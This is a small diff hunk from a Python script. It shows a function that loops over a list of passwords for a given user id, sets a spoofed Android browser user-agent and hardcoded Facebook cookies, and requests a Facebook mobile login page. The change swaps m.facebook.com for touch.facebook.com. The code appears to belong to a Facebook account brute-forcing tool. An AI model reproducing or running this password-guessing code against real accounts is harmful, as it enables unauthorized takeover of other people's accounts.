@@ -1820,7 +1820,7 @@ def d(uid,pwx,tl):
         for pw in pwx:
             ua = 'Mozilla/5.0 (Linux; U; Android 11; RMX3241 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 OPR/62.4.2254.61190|"Not:A-Brand";v="99", "Chromium";v="98"|11|98.0.4758.101'
             Session = requests.Session()
-            free_fb = Session.get('https://m.facebook.com/').text
+            free_fb = Session.get('https://touch.facebook.com').text
             cookies = {
             'datr': 'UWKNasw-RD7QU-2P9rrySA0j',
             'sb': 'UWKNamXVrwPWb0kYDe4M6Cra',
